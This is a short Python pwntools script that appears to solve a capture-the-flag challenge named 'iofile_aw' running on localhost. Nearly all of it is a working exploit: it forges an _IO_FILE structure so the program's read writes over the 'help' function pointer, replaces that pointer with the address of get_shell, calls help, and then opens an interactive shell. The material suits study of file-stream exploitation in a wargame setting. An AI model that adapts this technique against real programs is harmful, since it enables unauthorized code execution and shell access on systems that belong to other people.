from pwn import *

port = 1234
rem = remote("localhost", port)

elf = ELF("./Pwnable/iofile_aw/problem/iofile_aw")

buf_addr = elf.symbols['buf']
shell_addr = elf.symbols['get_shell']
help_addr = elf.symbols['help']

payload = p64(0xfbad2488)
payload += p64(0) # _IO_read_ptr
payload += p64(0) # _IO_read_end
payload += p64(0) # _IO_read_base
payload += p64(0) # _IO_write_base
payload += p64(0) # _IO_write_ptr
payload += p64(0) # _IO_write_end
payload += p64(help_addr) # _IO_buf_base
payload += p64(help_addr + 8) # _IO_buf_end
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0) # stdin

# rem.recvall()

pause()

rem.sendlineafter(b"# ", b"read")
rem.send(payload)

rem.sendlineafter(b"# ", b"printf " + str(buf_addr).encode())

rem.sendlineafter(b"# ", b"read")
rem.send(p64(shell_addr))

rem.sendlineafter(b"# ", b"help")

rem.interactive()
